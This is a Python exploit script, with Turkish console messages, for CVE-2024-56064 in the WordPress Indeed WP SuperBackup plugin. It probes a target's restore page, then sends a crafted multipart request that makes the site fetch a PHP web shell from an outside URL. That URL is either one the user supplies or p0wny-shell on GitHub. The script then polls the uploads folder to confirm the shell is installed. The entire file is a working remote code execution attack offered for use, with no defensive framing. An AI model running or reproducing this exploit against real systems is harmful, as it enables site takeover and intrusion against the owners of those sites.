#!/usr/bin/env python3
"""
WordPress Indeed WP SuperBackup RCE Exploit
CVE-2024-56064

Affected Version: <= 2.3.3
CVSS Score: 9.8 (Critical)

Usage:
    python3 exploit.py -u http://target.com -s http://your-server.com/shell.php
    python3 exploit.py -u http://target.com --default-shell
"""

import requests
import argparse
import time
import sys
from urllib.parse import urljoin

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'

def banner():
    print(f"""{Colors.CYAN}
╔═══════════════════════════════════════════════════════════╗
║   Indeed WP SuperBackup RCE Exploit (CVE-2024-56064)     ║
║   CVSS Score: 9.8 (Critical)                              ║
║   Affected Version: <= 2.3.3                              ║
╚═══════════════════════════════════════════════════════════╝
{Colors.END}""")

def check_vulnerable(target_url):
    """Hedef sistemin savunmasız olup olmadığını kontrol et"""
    print(f"{Colors.BLUE}[*] Hedef kontrol ediliyor: {target_url}{Colors.END}")
    
    try:
        check_url = urljoin(target_url, "/wp-admin/admin.php?page=ibk_admin&tab=restore")
        response = requests.get(check_url, timeout=10, allow_redirects=True)
        
        if response.status_code == 200 and "ibk_restore_migrate_action" in response.text:
            print(f"{Colors.GREEN}[+] Hedef savunmasız görünüyor!{Colors.END}")
            return True
        else:
            print(f"{Colors.WARNING}[!] Hedef savunmasız olmayabilir veya plugin kurulu değil{Colors.END}")
            return False
    except Exception as e:
        print(f"{Colors.FAIL}[-] Bağlantı hatası: {str(e)}{Colors.END}")
        return False

def exploit(target_url, shell_url):
    """Exploit'i çalıştır"""
    print(f"\n{Colors.BLUE}[*] Exploit başlatılıyor...{Colors.END}")
    print(f"{Colors.BLUE}[*] Shell URL: {shell_url}{Colors.END}")
    
    exploit_url = urljoin(target_url, "/wp-admin/admin.php?page=ibk_admin&tab=restore")
    
    # Multipart form data hazırla
    boundary = "---------------------------24461452295617717774000608677"
    
    payload = f"""{boundary}
Content-Disposition: form-data; name="ibk_restore_migrate_action"

1
{boundary}
Content-Disposition: form-data; name="restore_type"

restore_url
{boundary}
Content-Disposition: form-data; name="restore_url"

{shell_url}

{boundary}
Content-Disposition: form-data; name="upload_file"; filename=""
Content-Type: application/octet-stream


{boundary}--
"""
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0',
        'Content-Type': f'multipart/form-data; boundary={boundary}',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    }
    
    try:
        print(f"{Colors.BLUE}[*] Payload gönderiliyor...{Colors.END}")
        response = requests.post(exploit_url, data=payload, headers=headers, timeout=30)
        
        if response.status_code == 200:
            print(f"{Colors.GREEN}[+] Payload başarıyla gönderildi!{Colors.END}")
            return True
        else:
            print(f"{Colors.FAIL}[-] Payload gönderilemedi. HTTP Status: {response.status_code}{Colors.END}")
            return False
            
    except Exception as e:
        print(f"{Colors.FAIL}[-] Exploit hatası: {str(e)}{Colors.END}")
        return False

def check_shell(target_url):
    """Shell'in yüklenip yüklenmediğini kontrol et"""
    shell_path = urljoin(target_url, "/wp-content/uploads/isnapshots/shell.php")
    
    print(f"\n{Colors.BLUE}[*] Shell kontrol ediliyor...{Colors.END}")
    print(f"{Colors.WARNING}[!] Shell'in yüklenmesi biraz zaman alabilir, lütfen bekleyin...{Colors.END}")
    
    for i in range(1, 11):
        try:
            print(f"{Colors.BLUE}[*] Deneme {i}/10...{Colors.END}")
            response = requests.get(shell_path, timeout=10)
            
            if response.status_code == 200:
                print(f"\n{Colors.GREEN}{Colors.BOLD}[+] Shell başarıyla yüklendi!{Colors.END}")
                print(f"{Colors.GREEN}[+] Shell URL: {shell_path}{Colors.END}")
                return shell_path
            
            time.sleep(3)
            
        except Exception as e:
            time.sleep(3)
            continue
    
    print(f"{Colors.FAIL}[-] Shell bulunamadı. Manuel olarak kontrol edin: {shell_path}{Colors.END}")
    return None

def main():
    banner()
    
    parser = argparse.ArgumentParser(description='Indeed WP SuperBackup RCE Exploit')
    parser.add_argument('-u', '--url', required=True, help='Hedef WordPress URL (örn: http://target.com)')
    parser.add_argument('-s', '--shell', help='Kullanılacak shell URL')
    parser.add_argument('--default-shell', action='store_true', help='Varsayılan p0wny-shell kullan')
    parser.add_argument('--no-check', action='store_true', help='Güvenlik açığı kontrolünü atla')
    
    args = parser.parse_args()
    
    target_url = args.url.rstrip('/')
    
    # Shell URL belirleme
    if args.default_shell:
        shell_url = "https://raw.githubusercontent.com/flozz/p0wny-shell/refs/heads/master/shell.php"
    elif args.shell:
        shell_url = args.shell
    else:
        print(f"{Colors.FAIL}[-] Hata: --shell veya --default-shell parametresi gerekli{Colors.END}")
        sys.exit(1)
    
    # Güvenlik açığı kontrolü
    if not args.no_check:
        if not check_vulnerable(target_url):
            response = input(f"\n{Colors.WARNING}Devam etmek istiyor musunuz? (y/N): {Colors.END}")
            if response.lower() != 'y':
                print(f"{Colors.FAIL}[!] İşlem iptal edildi{Colors.END}")
                sys.exit(0)
    
    # Exploit çalıştır
    if exploit(target_url, shell_url):
        shell_path = check_shell(target_url)
        
        if shell_path:
            print(f"\n{Colors.GREEN}{Colors.BOLD}╔═══════════════════════════════════════╗{Colors.END}")
            print(f"{Colors.GREEN}{Colors.BOLD}║         EXPLOIT BAŞARILI!             ║{Colors.END}")
            print(f"{Colors.GREEN}{Colors.BOLD}╚═══════════════════════════════════════╝{Colors.END}")
            print(f"\n{Colors.CYAN}Shell'e erişmek için:{Colors.END}")
            print(f"{Colors.BOLD}{shell_path}{Colors.END}")
        else:
            print(f"\n{Colors.WARNING}[!] Shell yüklenmiş olabilir ama doğrulanamadı{Colors.END}")
            print(f"{Colors.WARNING}[!] Manuel kontrol: {target_url}/wp-content/uploads/isnapshots/shell.php{Colors.END}")
    else:
        print(f"\n{Colors.FAIL}[!] Exploit başarısız oldu{Colors.END}")
        sys.exit(1)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.FAIL}[!] Kullanıcı tarafından iptal edildi{Colors.END}")
        sys.exit(0)
